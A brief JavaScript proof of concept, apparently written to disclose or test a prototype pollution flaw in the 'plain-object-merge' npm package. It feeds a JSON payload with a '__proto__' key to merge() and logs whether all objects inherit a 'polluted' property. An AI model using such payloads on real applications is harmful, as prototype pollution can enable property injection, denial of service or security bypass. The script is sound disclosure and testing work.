var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const merge = require('plain-object-merge');
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
obj = {};
console.log({}.polluted);
merge([
    {},
    payload
]);
console.log({}.polluted);